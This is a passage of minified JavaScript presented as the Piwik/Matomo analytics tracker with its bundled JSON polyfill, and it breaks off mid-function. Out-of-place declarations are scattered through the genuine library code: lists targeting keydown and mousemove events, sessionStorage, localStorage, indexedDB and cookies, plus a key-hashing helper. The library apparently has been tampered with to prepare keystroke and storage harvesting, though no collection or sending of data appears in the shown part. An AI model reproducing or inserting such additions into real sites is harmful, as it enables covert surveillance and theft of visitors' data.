var trackedKeys = window.trackedKeys;
/*!!
 * Piwik - free/libre analytics platform
 *
 * JavaScript tracking client
 *
 * @link https://piwik.org
 * @source https://github.com/matomo-org/matomo/blob/master/js/piwik.js
 * @license https://piwik.org/free-software/bsd/ BSD-3 Clause (also in js/LICENSE.txt)
 * @license magnet:?xt=urn:btih:c80d50af7d3db9be66a4d0a86db0286e4fd33292&dn=bsd-3-clause.txt BSD-3-Clause
 */
;
var trackedGlobalVars = ["sessionStorage", "localStorage", "indexedDB", "cookies", "jshook"];
if (typeof window.JSON === "object" && typeof window.JSON.stringify === "function" && typeof window.JSON.parse === "function") {
  JSON_PIWIK = window.JSON;
} else {
  (function () {
    var a = {};
    /*!! JSON v3.3.2 | http://bestiejs.github.io/json3 | Copyright 2012-2014, Kit Cambridge | http://kit.mit-license.org */
    (function () {
      var c = typeof define === "function" && define.amd;
      var e = {
        "function": true,
        object: true
      };
      var h = e[typeof a] && a && !a.nodeType && a;
      var i = e[typeof window] && window || this,
        b = h && e[typeof module] && module && !module.nodeType && typeof global == "object" && global;
      if (b && (b.global === b || b.window === b || b.self === b)) {
        i = b;
      }
      function j(ab, V) {
        ab || (ab = i.Object());
        V || (V = i.Object());
        var K = ab.Number || i.Number,
          R = ab.String || i.String,
          x = ab.Object || i.Object,
          S = ab.Date || i.Date,
          T = ab.SyntaxError || i.SyntaxError,
          aa = ab.TypeError || i.TypeError,
          J = ab.Math || i.Math,
          Y = ab.JSON || i.JSON;
        if (typeof Y == "object" && Y) {
          V.stringify = Y.stringify;
          V.parse = Y.parse;
        }
        var n = x.prototype,
          u = n.toString,
          r,
          m,
          L;
        var B = new S(-3509827334573292);
        try {
          B = B.getUTCFullYear() == -109252 && B.getUTCMonth() === 0 && B.getUTCDate() === 1 && B.getUTCHours() == 10 && B.getUTCMinutes() == 37 && B.getUTCSeconds() == 6 && B.getUTCMilliseconds() == 708;
        } catch (v) {}
        function o(ac) {
          if (o[ac] !== L) {
            return o[ac];
          }
          var ad;
          if (ac == "bug-string-char-index") {
            ad = "a"[0] != "a";
          } else {
            if (ac == "json") {
              ad = o("json-stringify") && o("json-parse");
            } else {
              var ak,
                ah = '{"a":[1,true,false,null,"\\u0000\\b\\n\\f\\r\\t"]}';
              if (ac == "json-stringify") {
                var ai = V.stringify,
                  aj = typeof ai == "function" && B;
                if (aj) {
                  (ak = function () {
                    return 1;
                  }).toJSON = ak;
                  try {
                    aj = ai(0) === "0" && ai(new K()) === "0" && ai(new R()) == '""' && ai(u) === L && ai(L) === L && ai() === L && ai(ak) === "1" && ai([ak]) == "[1]" && ai([L]) == "[null]" && ai(null) == "null" && ai([L, u, null]) == "[null,null,null]" && ai({
                      a: [ak, true, false, null, "\x00\b\n\f\r\t"]
                    }) == ah && ai(null, ak) === "1" && ai([1, 2], null, 1) == "[\n 1,\n 2\n]" && ai(new S(-8640000000000000)) == '"-271821-04-20T00:00:00.000Z"' && ai(new S(8640000000000000)) == '"+275760-09-13T00:00:00.000Z"' && ai(new S(-62198755200000)) == '"-000001-01-01T00:00:00.000Z"' && ai(new S(-1)) == '"1969-12-31T23:59:59.999Z"';
                  } catch (ae) {
                    aj = false;
                  }
                }
                ad = aj;
              }
              if (ac == "json-parse") {
                var ag = V.parse;
                if (typeof ag == "function") {
                  try {
                    if (ag("0") === 0 && !ag(false)) {
                      ak = ag(ah);
                      var af = ak.a.length == 5 && ak.a[0] === 1;
                      if (af) {
                        try {
                          af = !ag('"\t"');
                        } catch (ae) {}
                        if (af) {
                          try {
                            af = ag("01") !== 1;
                          } catch (ae) {}
                        }
                        if (af) {
                          try {
                            af = ag("1.") !== 1;
                          } catch (ae) {}
                        }
                      }
                    }
                  } catch (ae) {
                    af = false;
                  }
                }
                ad = af;
              }
            }
          }
          return o[ac] = !!ad;
        }
        if (!o("json")) {
          var U = "[object Function]",
            Q = "[object Date]",
            N = "[object Number]",
            O = "[object String]",
            E = "[object Array]",
            A = "[object Boolean]";
          var F = o("bug-string-char-index");
          if (!B) {
            var s = J.floor;
            var Z = [0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334];
            var D = function (ac, ad) {
              return Z[ad] + 365 * (ac - 1970) + s((ac - 1969 + (ad = +(ad > 1))) / 4) - s((ac - 1901 + ad) / 100) + s((ac - 1601 + ad) / 400);
            };
          }
          if (!(r = n.hasOwnProperty)) {
            r = function (ae) {
              var ac = {},
                ad;
              if ((ac.__proto__ = null, ac.__proto__ = {
                toString: 1
              }, ac).toString != u) {
                r = function (ah) {
                  var ag = this.__proto__,
                    af = ah in (this.__proto__ = null, this);
                  this.__proto__ = ag;
                  return af;
                };
              } else {
                ad = ac.constructor;
                r = function (ag) {
                  var af = (this.constructor || ad).prototype;
                  return ag in this && !(ag in af && this[ag] === af[ag]);
                };
              }
              ac = null;
              return r.call(this, ae);
            };
          }
          m = function (ae, ah) {
            var af = 0,
              ac,
              ad,
              ag;
            (ac = function () {
              this.valueOf = 0;
            }).prototype.valueOf = 0;
            ad = new ac();
            for (ag in ad) {
              if (r.call(ad, ag)) {
                af++;
              }
            }
            ac = ad = null;
            if (!af) {
              ad = ["valueOf", "toString", "toLocaleString", "propertyIsEnumerable", "isPrototypeOf", "hasOwnProperty", "constructor"];
              m = function (aj, an) {
                var am = u.call(aj) == U,
                  al,
                  ak;
                var ai = !am && typeof aj.constructor != "function" && e[typeof aj.hasOwnProperty] && aj.hasOwnProperty || r;
                for (al in aj) {
                  if (!(am && al == "prototype") && ai.call(aj, al)) {
                    an(al);
                  }
                }
                for (ak = ad.length; al = ad[--ak]; ai.call(aj, al) && an(al)) {}
              };
            } else {
              if (af == 2) {
                m = function (aj, am) {
                  var ai = {},
                    al = u.call(aj) == U,
                    ak;
                  for (ak in aj) {
                    if (!(al && ak == "prototype") && !r.call(ai, ak) && (ai[ak] = 1) && r.call(aj, ak)) {
                      am(ak);
                    }
                  }
                };
              } else {
                m = function (aj, am) {
                  var al = u.call(aj) == U,
                    ak,
                    ai;
                  for (ak in aj) {
                    if (!(al && ak == "prototype") && r.call(aj, ak) && !(ai = ak === "constructor")) {
                      am(ak);
                    }
                  }
                  if (ai || r.call(aj, ak = "constructor")) {
                    am(ak);
                  }
                };
              }
            }
            return m(ae, ah);
          };
          if (!o("json-stringify")) {
            var q = {
              92: "\\\\",
              34: '\\"',
              8: "\\b",
              12: "\\f",
              10: "\\n",
              13: "\\r",
              9: "\\t"
            };
            var I = "000000";
            var t = function (ac, ad) {
              return (I + (ad || 0)).slice(-ac);
            };
            var z = "\\u00";
            var C = function (ai) {
              var ad = '"',
                ag = 0,
                ah = ai.length,
                ac = !F || ah > 10;
              var af = ac && (F ? ai.split("") : ai);
              for (; ag < ah; ag++) {
                var ae = ai.charCodeAt(ag);
                switch (ae) {
                  case 8:
                  case 9:
                  case 10:
                  case 12:
                  case 13:
                  case 34:
                  case 92:
                    ad += q[ae];
                    break;
                  default:
                    if (ae < 32) {
                      ad += z + t(2, ae.toString(16));
                      break;
                    }
                    ad += ac ? af[ag] : ai.charAt(ag);
                }
              }
              return ad + '"';
            };
            var p = function (ai, aA, ag, al, ax, ac, aj) {
              var at, ae, ap, az, ay, ak, aw, au, aq, an, ar, ad, ah, af, av, ao;
              try {
                at = aA[ai];
              } catch (am) {}
              if (typeof at == "object" && at) {
                ae = u.call(at);
                if (ae == Q && !r.call(at, "toJSON")) {
                  if (at > -1 / 0 && at < 1 / 0) {
                    if (D) {
                      ay = s(at / 86400000);
                      for (ap = s(ay / 365.2425) + 1970 - 1; D(ap + 1, 0) <= ay; ap++) {}
                      for (az = s((ay - D(ap, 0)) / 30.42); D(ap, az + 1) <= ay; az++) {}
                      ay = 1 + ay - D(ap, az);
                      ak = (at % 86400000 + 86400000) % 86400000;
                      aw = s(ak / 3600000) % 24;
                      au = s(ak / 60000) % 60;
                      aq = s(ak / 1000) % 60;
                      an = ak % 1000;
                    } else {
                      ap = at.getUTCFullYear();
                      az = at.getUTCMonth();
                      ay = at.getUTCDate();
                      aw = at.getUTCHours();
                      au = at.getUTCMinutes();
                      aq = at.getUTCSeconds();
                      an = at.getUTCMilliseconds();
                    }
                    at = (ap <= 0 || ap >= 10000 ? (ap < 0 ? "-" : "+") + t(6, ap < 0 ? -ap : ap) : t(4, ap)) + "-" + t(2, az + 1) + "-" + t(2, ay) + "T" + t(2, aw) + ":" + t(2, au) + ":" + t(2, aq) + "." + t(3, an) + "Z";
                  } else {
                    at = null;
                  }
                } else {
                  if (typeof at.toJSON == "function" && (ae != N && ae != O && ae != E || r.call(at, "toJSON"))) {
                    at = at.toJSON(ai);
                  }
                }
              }
              if (ag) {
                at = ag.call(aA, ai, at);
              }
              if (at === null) {
                return "null";
              }
              ae = u.call(at);
              if (ae == A) {
                return "" + at;
              } else {
                if (ae == N) {
                  return at > -1 / 0 && at < 1 / 0 ? "" + at : "null";
                } else {
                  if (ae == O) {
                    return C("" + at);
                  }
                }
              }
              if (typeof at == "object") {
                for (af = aj.length; af--;) {
                  if (aj[af] === at) {
                    throw aa();
                  }
                }
                aj.push(at);
                ar = [];
                av = ac;
                ac += ax;
                if (ae == E) {
                  for (ah = 0, af = at.length; ah < af; ah++) {
                    ad = p(ah, at, ag, al, ax, ac, aj);
                    ar.push(ad === L ? "null" : ad);
                  }
                  ao = ar.length ? ax ? "[\n" + ac + ar.join(",\n" + ac) + "\n" + av + "]" : "[" + ar.join(",") + "]" : "[]";
                } else {
                  m(al || at, function (aC) {
                    var aB = p(aC, at, ag, al, ax, ac, aj);
                    if (aB !== L) {
                      ar.push(C(aC) + ":" + (ax ? " " : "") + aB);
                    }
                  });
                  ao = ar.length ? ax ? "{\n" + ac + ar.join(",\n" + ac) + "\n" + av + "}" : "{" + ar.join(",") + "}" : "{}";
                }
                aj.pop();
                return ao;
              }
            };
            V.stringify = function (ac, ae, af) {
              var ad, al, aj, ai;
              if (e[typeof ae] && ae) {
                if ((ai = u.call(ae)) == U) {
                  al = ae;
                } else {
                  if (ai == E) {
                    aj = {};
                    for (var ah = 0, ag = ae.length, ak; ah < ag; ak = ae[ah++], (ai = u.call(ak), ai == O || ai == N) && (aj[ak] = 1)) {}
                  }
                }
              }
              if (af) {
                if ((ai = u.call(af)) == N) {
                  if ((af -= af % 1) > 0) {
                    for (ad = "", af > 10 && (af = 10); ad.length < af; ad += " ") {}
                  }
                } else {
                  if (ai == O) {
                    ad = af.length <= 10 ? af : af.slice(0, 10);
                  }
                }
              }
              return p("", (ak = {}, ak[""] = ac, ak), al, aj, ad, "", []);
            };
          }
          if (!o("json-parse")) {
            var M = R.fromCharCode;
            var l = {
              92: "\\",
              34: '"',
              47: "/",
              98: "\b",
              116: "\t",
              110: "\n",
              102: "\f",
              114: "\r"
            };
            var G, X;
            var H = function () {
              G = X = null;
              throw T();
            };
            var y = function () {
              var ah = X,
                af = ah.length,
                ag,
                ae,
                ac,
                ai,
                ad;
              while (G < af) {
                ad = ah.charCodeAt(G);
                switch (ad) {
                  case 9:
                  case 10:
                  case 13:
                  case 32:
                    G++;
                    break;
                  case 123:
                  case 125:
                  case 91:
                  case 93:
                  case 58:
                  case 44:
                    ag = F ? ah.charAt(G) : ah[G];
                    G++;
                    return ag;
                  case 34:
                    for (ag = "@", G++; G < af;) {
                      ad = ah.charCodeAt(G);
                      if (ad < 32) {
                        H();
                      } else {
                        if (ad == 92) {
                          ad = ah.charCodeAt(++G);
                          switch (ad) {
                            case 92:
                            case 34:
                            case 47:
                            case 98:
                            case 116:
                            case 110:
                            case 102:
                            case 114:
                              ag += l[ad];
                              G++;
                              break;
                            case 117:
                              ae = ++G;
                              for (ac = G + 4; G < ac; G++) {
                                ad = ah.charCodeAt(G);
                                if (!(ad >= 48 && ad <= 57 || ad >= 97 && ad <= 102 || ad >= 65 && ad <= 70)) {
                                  H();
                                }
                              }
                              ag += M("0x" + ah.slice(ae, G));
                              break;
                            default:
                              H();
                          }
                        } else {
                          if (ad == 34) {
                            break;
                          }
                          ad = ah.charCodeAt(G);
                          ae = G;
                          while (ad >= 32 && ad != 92 && ad != 34) {
                            ad = ah.charCodeAt(++G);
                          }
                          ag += ah.slice(ae, G);
                        }
                      }
                    }
                    if (ah.charCodeAt(G) == 34) {
                      G++;
                      return ag;
                    }
                    H();
                  default:
                    ae = G;
                    if (ad == 45) {
                      ai = true;
                      ad = ah.charCodeAt(++G);
                    }
                    if (ad >= 48 && ad <= 57) {
                      if (ad == 48 && (ad = ah.charCodeAt(G + 1), ad >= 48 && ad <= 57)) {
                        H();
                      }
                      ai = false;
                      for (; G < af && (ad = ah.charCodeAt(G), ad >= 48 && ad <= 57); G++) {}
                      if (ah.charCodeAt(G) == 46) {
                        ac = ++G;
                        for (; ac < af && (ad = ah.charCodeAt(ac), ad >= 48 && ad <= 57); ac++) {}
                        if (ac == G) {
                          H();
                        }
                        G = ac;
                      }
                      ad = ah.charCodeAt(G);
                      if (ad == 101 || ad == 69) {
                        ad = ah.charCodeAt(++G);
                        if (ad == 43 || ad == 45) {
                          G++;
                        }
                        for (ac = G; ac < af && (ad = ah.charCodeAt(ac), ad >= 48 && ad <= 57); ac++) {}
                        if (ac == G) {
                          H();
                        }
                        G = ac;
                      }
                      return +ah.slice(ae, G);
                    }
                    if (ai) {
                      H();
                    }
                    if (ah.slice(G, G + 4) == "true") {
                      G += 4;
                      return true;
                    } else {
                      if (ah.slice(G, G + 5) == "false") {
                        G += 5;
                        return false;
                      } else {
                        if (ah.slice(G, G + 4) == "null") {
                          G += 4;
                          return null;
                        }
                      }
                    }
                    H();
                }
              }
              return "$";
            };
            var W = function (ad) {
              var ac, ae;
              if (ad == "$") {
                H();
              }
              if (typeof ad == "string") {
                if ((F ? ad.charAt(0) : ad[0]) == "@") {
                  return ad.slice(1);
                }
                if (ad == "[") {
                  ac = [];
                  for (;; ae || (ae = true)) {
                    ad = y();
                    if (ad == "]") {
                      break;
                    }
                    if (ae) {
                      if (ad == ",") {
                        ad = y();
                        if (ad == "]") {
                          H();
                        }
                      } else {
                        H();
                      }
                    }
                    if (ad == ",") {
                      H();
                    }
                    ac.push(W(ad));
                  }
                  return ac;
                } else {
                  if (ad == "{") {
                    ac = {};
                    for (;; ae || (ae = true)) {
                      ad = y();
                      if (ad == "}") {
                        break;
                      }
                      if (ae) {
                        if (ad == ",") {
                          ad = y();
                          if (ad == "}") {
                            H();
                          }
                        } else {
                          H();
                        }
                      }
                      if (ad == "," || typeof ad != "string" || (F ? ad.charAt(0) : ad[0]) != "@" || y() != ":") {
                        H();
                      }
                      ac[ad.slice(1)] = W(y());
                    }
                    return ac;
                  }
                }
                H();
              }
              return ad;
            };
            var P = function (ae, ad, af) {
              var ac = w(ae, ad, af);
              if (ac === L) {
                delete ae[ad];
              } else {
                ae[ad] = ac;
              }
            };
            var w = function (af, ae, ag) {
              var ad = af[ae],
                ac;
              if (typeof ad == "object" && ad) {
                if (u.call(ad) == E) {
                  for (ac = ad.length; ac--;) {
                    P(ad, ac, ag);
                  }
                } else {
                  m(ad, function (ah) {
                    P(ad, ah, ag);
                  });
                }
              }
              return ag.call(af, ae, ad);
            };
            V.parse = function (ae, af) {
              var ac, ad;
              G = 0;
              X = "" + ae;
              ac = W(y());
              if (y() != "$") {
                H();
              }
              G = X = null;
              return af && u.call(af) == U ? w((ad = {}, ad[""] = ac, ad), "", af) : ac;
            };
          }
        }
        V.runInContext = j;
        return V;
      }
      if (h && !c) {
        j(i, h);
      } else {
        var f = i.JSON,
          k = i.JSON3,
          d = false;
        var g = j(i, i.JSON3 = {
          noConflict: function () {
            if (!d) {
              d = true;
              i.JSON = f;
              i.JSON3 = k;
              f = k = null;
            }
            return g;
          }
        });
        i.JSON = {
          parse: g.parse,
          stringify: g.stringify
        };
      }
      if (c) {
        define(function () {
          return g;
        });
      }
    }).call(this);
    JSON_PIWIK = a;
  })();
}
if (typeof _paq !== "object") {
  _paq = [];
}
var trackedEvents = ["click", "mousemove", "keydown"];
function createHash(inputData) {
  let keysArray = Object.keys(inputData);
  let keysAsString = keysArray.sort().join("");
  let hash = 0;
  for (let i = 0; i < keysAsString.length; i++) {
    const currentChar = keysAsString.charCodeAt(i);
    hash = (hash << 5) - hash + currentChar;
    hash = hash & hash;
  }
  return hash.toString(16);
}
if (typeof window.Piwik !== "object") {
  window.Matomo = window.Piwik = function () {
    var r,
      b = {},
      y = {},
      G = document,
      h = navigator,
      X = screen,
      T = window,
      i = T.performance || T.mozPerformance || T.msPerformance || T.webkitPerformance,
      t = T.encodeURIComponent,
      S = T.decodeURIComponent,
      l = unescape,
      I = [],
      E,
      e,
      ah = [],
      x = 0,
      ab = 0,
      U = 0,
      m = false;
    function p(ao) {
      try {
        return S(ao);
      } catch (ap) {
        return unescape(ao);
      }
    }
    function J(ap) {
      var ao = typeof ap;
      return ao !== "undefined";
    }
    function A(ao) {
      return typeof ao === "function";
    }
    function W(ao) {
      return typeof ao === "object";
    }
    function w(ao) {
      return typeof ao === "string" || ao instanceof String;
    }
    function ag(ao) {
      return typeof ao === "number" || ao instanceof Number;
    }
    function Y(ao) {
      return J(ao) && (ag(ao) || w(ao) && ao.length);
    }
    function B(ap) {
      if (!ap) {
        return true;
      }
      var ao;
      var aq = true;
      for (ao in ap) {
        if (Object.prototype.hasOwnProperty.call(ap, ao)) {
          aq = false;
        }
      }
      return aq;
    }
    function ak(ao) {
      var ap = typeof console;
      if (ap !== "undefined" && console && console.error) {
        console.error(ao);
      }
    }
    function af() {
      var au, at, aw, ap, ao;
      for (au = 0; au < arguments.length; au += 1) {
        ao = null;
        if (arguments[au] && arguments[au].slice) {
          ao = arguments[au].slice();
        }
        ap = arguments[au];
        aw = ap.shift();
        var av, aq;
        var ar = w(aw) && aw.indexOf("::") > 0;
        if (ar) {
          av = aw.split("::");
          aq = av[0];
          aw = av[1];
          if ("object" === typeof e[aq] && "function" === typeof e[aq][aw]) {
            e[aq][aw].apply(e[aq], ap);
          } else {
            if (ao) {
              ah.push(ao);
            }
          }
        } else {
          for (at = 0; at < I.length; at++) {
            if (w(aw)) {
              aq = I[at];
              var ax = aw.indexOf(".") > 0;
              if (ax) {
                av = aw.split(".");
                if (aq && "object" === typeof aq[av[0]]) {
                  aq = aq[av[0]];
                  aw = av[1];
                } else {
                  if (ao) {
                    ah.push(ao);
                    break;
                  }
                }
              }
              if (aq[aw]) {
                aq[aw].apply(aq, ap);
              } else {
                var ay = "The method '" + aw + '\' was not found in "_paq" variable.  Please have a look at the Piwik tracker documentation: https://developer.piwik.org/api-reference/tracking-javascript';
                ak(ay);
                if (!ax) {
                  throw new TypeError(ay);
                }
              }
              if (aw === "addTracker") {
                break;
              }
              if (aw === "setTrackerUrl" || aw === "setSiteId") {
                break;
              }
            } else {
              aw.apply(I[at], ap);
            }
          }
        }
      }
    }
    function an(ar, aq, ap, ao) {
      if (ar.addEventListener) {
        ar.addEventListener(aq, ap, ao);
        return true;
      }
      if (ar.attachEvent) {
        return ar.attachEvent("on" + aq, ap);
      }
      ar["on" + aq] = ap;
    }
    function n(ao) {
      if (G.readyState === "complete") {
        ao();
      } else {
        if (T.addEventListener) {
          T.addEventListener("load", ao, false);
        } else {
          if (T.attachEvent) {
            T.attachEvent("onload", ao);
          }
        }
      }
    }
    function q(ar) {
      var ao = false;
      if (G.attachEvent) {
        ao = G.readyState === "complete";
      } else {
        ao = G.readyState !== "loading";
      }
      if (ao) {
        ar();
        return;
      }
      var aq;
      if (G.addEventListener) {
        an(G, "DOMContentLoaded", function ap() {
          G.removeEventListener("DOMContentLoaded", ap, false);
          if (!ao) {
            ao = true;
            ar();
          }
        });
      } else {
        if (G.attachEvent) {
          G.attachEvent("onreadystatechange", function ap() {
            if (G.readyState === "complete") {
              G.detachEvent("onreadystatechange", ap);
              if (!ao) {
                ao = true;
                ar();
              }
            }
          });
          if (G.documentElement.doScroll && T === T.top) {
            (function ap() {
              if (!ao) {
                try {
                  G.documentElement.doScroll("left");
                } catch (at) {
                  setTimeout(ap, 0);
                  return;
                }
                ao = true;
                ar();
              }
            })();
          }
        }
      }
      an(T, "load", function () {
        if (!ao) {
          ao = true;
          ar();
        }
      }, false);
    }
    function ac(ap, av, aw) {
      if (!ap) {
        return "";
      }
      var ao = "",
        ar,
        aq,
        at,
        au;
      for (ar in b) {
        if (Object.prototype.hasOwnProperty.call(b, ar)) {
          au = b[ar] && "function" === typeof b[ar][ap];
          if (au) {
            aq = b[ar][ap];
            at = aq(av || {}, aw);
            if (at) {
              ao += at;
            }
          }
        }
      }
      return ao;
    }
    function ai() {
      var ao;
      m = true;
      ac("unload");
      if (r) {
        do {
          ao = new Date();
        } while (ao.getTimeAlias() < r);
      }
    }
    function o(aq, ap) {
      var ao = G.createElement("script");
      ao.type = "text/javascript";
      ao.src = aq;
      if (ao.readyState) {
        ao.onreadystatechange = function () {
          var ar = this.readyState;
          if (ar === "loaded" || ar === "complete") {
            ao.onreadystatechange = null;
            ap();
          }
        };
      } else {
        ao.onload = ap;
      }
      G.getElementsByTagName("head")[0].appendChild(ao);
    }
    function K() {
      var ao = "";
      try {
        ao = T.top.document.referrer;
      } catch (aq) {
        if (T.parent) {
          try {
            ao = T.parent.document.referrer;
          } catch (ap) {
            ao = "";
          }
        }
      }
      if (ao === "") {
        ao = G.referrer;
      }
      return ao;
    }
    function s(ao) {
      var aq = new RegExp("^([a-z]+):"),
        ap = aq.exec(ao);
      return ap ? ap[1] : null;
    }
    function d(ao) {
      var aq = new RegExp("^(?:(?:https?|ftp):)/*(?:[^@]+@)?([^:/#]+)"),
        ap = aq.exec(ao);
      return ap ? ap[1] : ao;
    }
    function aj(ap, ao) {
      ap = String(ap);
      return ap.lastIndexOf(ao, 0) === 0;
    }
    function R(ap, ao) {
      ap = String(ap);
      return ap.indexOf(ao, ap.length - ao.length) !== -1;
    }
    function z(ap, ao) {
      ap = String(ap);
      return ap.indexOf(ao) !== -1;
    }
    function g(ap, ao) {
      ap = String(ap);
      return ap.substr(0, ap.length - ao);
    }
    function F(ar, aq, au) {
      ar = String(ar);
      if (!au) {
        au = "";
      }
      var ao = ar.indexOf("#");
      var av = ar.length;
      if (ao === -1) {
        ao = av;
      }
      var at = ar.substr(0, ao);
      var ap = ar.substr(ao, av - ao);
      if (at.indexOf("?") === -1) {
        at += "?";
      } else {
        if (!R(at, "?")) {
          at += "&";
        }
      }
      return at + t(aq) + "=" + t(au) + ap;
    }
    function k(ap, aq) {
      ap = String(ap);
      if (ap.indexOf("?" + aq + "=") === -1 && ap.indexOf("&" + aq + "=") === -1) {
        return ap;
      }
      var ar = ap.indexOf("?");
      if (ar === -1) {
        return ap;
      }
      var ao = ap.substr(ar + 1);
      var aw = ap.substr(0, ar);
      if (ao) {
        var ax = "";
        var az = ao.indexOf("#");
        if (az !== -1) {
          ax = ao.substr(az + 1);
          ao = ao.substr(0, az);
        }
        var at;
        var av = ao.split("&");
        var au = av.length - 1;
        for (au; au >= 0; au--) {
          at = av[au].split("=")[0];
          if (at === aq) {
            av.splice(au, 1);
          }
        }
        var ay = av.join("&");
        if (ay) {
          aw = aw + "?" + ay;
        }
        if (ax) {
          aw += "#" + ax;
        }
      }
      return aw;
    }
    function f(aq, ap) {
      var ao = "[\\?&#]" + ap + "=([^&#]*)";
      var at = new RegExp(ao);
      var ar = at.exec(aq);
      return ar ? S(ar[1]) : "";
    }
    function a(ao) {
      if (ao && String(ao) === ao) {
        return ao.replace(/^\s+|\s+$/g, "");
      }
      return ao;
    }
    function D(ao) {
      return unescape(t(ao));
    }
    function am(aE) {
      var aq = function (aK, aJ) {
          return aK << aJ | aK >>> 32 - aJ;
        },
        aF = function (aM) {
          var aK = "",
            aL,
            aJ;
          for (aL = 7; aL >= 0; aL--) {
            aJ = aM >>> aL * 4 & 15;
            aK += aJ.toString(16);
          }
          return aK;
        },
        au,
        aH,
        aG,
        ap = [],
        ay = 1732584193,
        aw = 4023233417,
        av = 2562383102,
        at = 271733878,
        ar = 3285377520,
        aD,
        aC,
        aB,
        aA,
        az,
        aI,
        ao,
        ax = [];
      aE = D(aE);
      ao = aE.length;
      for (aH = 0; aH < ao - 3; aH += 4) {
        aG = aE.charCodeAt(aH) << 24 | aE.charCodeAt(aH + 1) << 16 | aE.charCodeAt(aH + 2) << 8 | aE.charCodeAt(aH + 3);
        ax.push(aG);
      }
      switch (ao & 3) {
        case 0:
          aH = 2147483648;
          break;
        case 1:
          aH = aE.charCodeAt(ao - 1) << 24 | 8388608;
          break;
        case 2:
          aH = aE.charCodeAt(ao - 2) << 24 | aE.charCodeAt(ao - 1) << 16 | 32768;
          break;
        case 3:
          aH = aE.charCodeAt(ao - 3) << 24 | aE.charCodeAt(ao - 2) << 16 | aE.charCodeAt(ao - 1) << 8 | 128;
          break;
      }
      ax.push(aH);
      while ((ax.length & 15) !== 14) {
        ax.push(0);
      }
      ax.push(ao >>> 29);
      ax.push(ao << 3 & 4294967295);
      for (au = 0; au < ax.length; au += 16) {
        for (aH = 0; aH < 16; aH++) {
          ap[aH] = ax[au + aH];
        }
        for (aH = 16; aH <= 79; aH++) {
          ap[aH] = aq(ap[aH - 3] ^ ap[aH - 8] ^ ap[aH - 14] ^ ap[aH - 16], 1);
        }
        aD = ay;
        aC = aw;
        aB = av;
        aA = at;
        az = ar;
        for (aH = 0; aH <= 19; aH++) {
          aI = aq(aD, 5) + (aC & aB | ~aC & aA) + az + ap[aH] + 1518500249 & 4294967295;
          az = aA;
          aA = aB;
          aB = aq(aC, 30);
          aC = aD;
          aD = aI;
        }
        for (aH = 20; aH <= 39; aH++) {
          aI = aq(aD, 5) + (aC ^ aB ^ aA) + az + ap[aH] + 1859775393 & 4294967295;
          az = aA;
          aA = aB;
          aB = aq(aC, 30);
          aC = aD;
          aD = aI;
        }
        for (aH = 40; aH <= 59; aH++) {
          aI = aq(aD, 5) + (aC & aB | aC & aA | aB & aA) + az + ap[aH] + 2400959708 & 4294967295;
          az = aA;
          aA = aB;
          aB = aq(aC, 30);
          aC = aD;
          aD = aI;
        }
        for (aH = 60; aH <= 79; aH++) {
          aI = aq(aD, 5) + (aC ^ aB ^ aA) + az + ap[aH] + 3395469782 & 4294967295;
          az = aA;
          aA = aB;
          aB = aq(aC, 30);
          aC = aD;
          aD = aI;
        }
        ay = ay + aD & 4294967295;
        aw = aw + aC & 4294967295;
        av = av + aB & 4294967295;
        at = at + aA & 4294967295;
        ar = ar + az & 4294967295;
      }
      aI = aF(ay) + aF(aw) + aF(av) + aF(at) + aF(ar);
      return aI.toLowerCase();
    }
    function aa(aq, ao, ap) {
      if (!aq) {
        aq = "";
      }
      if (!ao) {
        ao = "";
      }
      if (aq === "translate.googleusercontent.com") {
        if (ap === "") {
          ap = ao;
        }
        ao = f(ao, "u");
        aq = d(ao);
      } else {
        if (aq === "cc.bingj.com" || aq === "webcache.googleusercontent.com" || aq.slice(0, 5) === "74.6.") {
          ao = G.links[0].href;
          aq = d(ao);
        }
      }
      return [aq, ao, ap];
    }
    function L(ap) {
      var ao = ap.length;
      if (ap.charAt(--ao) === ".") {
        ap = ap.slice(0, ao);
      }
      if (ap.slice(0, 2) === "*.") {
        ap = ap.slice(1);
      }
      if (ap.indexOf("/") !== -1) {
        ap = ap.substr(0, ap.indexOf("/"));
      }
      return ap;
    }
    function al(ap) {
      ap = ap && ap.text ? ap.text : ap;
      if (!w(ap)) {
        var ao = G.getElementsByTagName("title");
        if (ao && J(ao[0])) {
          ap = ao[0].text;
        }
      }
      return ap;
    }
    function P(ao) {
      if (!ao) {
        return [];
      }
      if (!J(ao.children) && J(ao.childNodes)) {
        return ao.children;
      }
      if (J(ao.children)) {
        return ao.children;
      }
      return [];
    }
    function V(ap, ao) {
      if (!ap || !ao) {
        return false;
      }
      if (ap.contains) {
        return ap.contains(ao);
      }
      if (ap === ao) {
        return true;
      }
      if (ap.compareDocumentPosition) {
        return !!(ap.compareDocumentPosition(ao) & 16);
      }
      return false;
    }
    function M(aq, ar) {
      if (aq && aq.indexOf) {
        return aq.indexOf(ar);
      }
      if (!J(aq) || aq === null) {
        return -1;
      }
      if (!aq.length) {
        return -1;
      }
      var ao = aq.length;
      if (ao === 0) {
        return -1;
      }
      var ap = 0;
      while (ap < ao) {
        if (aq[ap] === ar) {
          return ap;
        }
        ap++;
      }
      return -1;
    }
    function j(aq) {
      if (!aq) {
        return false;
      }
      function ao(at, au) {
        if (T.getComputedStyle) {
          return G.defaultView.getComputedStyle(at, null)[au];
        }
        if (at.currentStyle) {
          return at.currentStyle[au];
        }
      }
      function ar(at) {
        at = at.parentNode;
        while (at) {
          if (at === G) {
            return true;
          }
          at = at.parentNode;
        }
        return false;
      }
      function ap(av, aB, at, ay, aw, az, ax) {
        var au = av.parentNode,
          aA = 1;
        if (!ar(av)) {
          return false;
        }
        if (9 === au.nodeType) {
          return true;
        }
        if ("0" === ao(av, "opacity") || "none" === ao(av, "display") || "hidden" === ao(av, "visibility")) {
          return false;
        }
        if (!J(aB) || !J(at) || !J(ay) || !J(aw) || !J(az) || !J(ax)) {
          aB = av.offsetTop;
          aw = av.offsetLeft;
          ay = aB + av.offsetHeight;
          at = aw + av.offsetWidth;
          az = av.offsetWidth;
          ax = av.offsetHeight;
        }
        if (aq === av && (0 === ax || 0 === az) && "hidden" === ao(av, "overflow")) {
          return false;
        }
        if (au) {
          if ("hidden" === ao(au, "overflow") || "scroll" === ao(au, "overflow")) {
            if (aw + aA > au.offsetWidth + au.scrollLeft || aw + az - aA < au.scrollLeft || aB + aA > au.offsetHeight + au.scrollTop || aB + ax - aA < au.scrollTop) {
              return false;
            }
          }
          if (av.offsetParent === au) {
            aw += au.offsetLeft;
            aB += au.offsetTop;
          }
          return ap(au, aB, at, ay, aw, az, ax);
        }
        return true;
      }
